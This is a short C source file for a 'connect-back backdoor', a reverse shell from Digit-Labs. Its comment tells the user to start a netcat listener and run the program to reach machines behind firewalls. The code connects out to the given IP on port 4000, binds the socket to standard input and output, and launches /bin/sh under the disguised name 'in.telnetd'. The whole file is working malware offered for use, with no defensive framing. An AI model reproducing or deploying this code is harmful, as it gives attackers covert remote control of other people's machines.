/* Digit-Labs Connect-Back Backdoor
 * 
 * Use this backdoor to access 
 * machines behind firewalls.
 * 
 * step 1. setup a listening port
 *                on your box e.g. 
 *                nc -l -p 4000
 *
 * step 2. Run this file  :
 * ./cbd <ip_of_listening_machine>
 * 
 * grazer@digit-labs.org
 * http://www.digit-labs.org
 *
 */
  
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/in.h>
#include <netdb.h>

int fd, sock;
int port = 4000;
struct sockaddr_in addr;

char mesg[]  = "\n[ Digit-Labs Connect-Back Backdoor ]\n    * Connected to CommandLine...
\n";
char shell[] = "/bin/sh";

int main(int argc, char *argv[]) {
        while(argc<2) {
        fprintf(stderr, "\n\n %s <ip> \n\n", argv[0]);
        exit(0); }



addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(argv[1]);
fd = socket(AF_INET, SOCK_STREAM, 0);
connect(fd, (struct sockaddr*)&addr, sizeof(addr));

send(fd, mesg, sizeof(mesg), 0);

dup2(fd, 0); // thnx dvorak 
dup2(fd, 1); 
dup2(fd, 2); 
execl(shell, "in.telnetd", 0);     

 
close(fd);


return 1;
}       

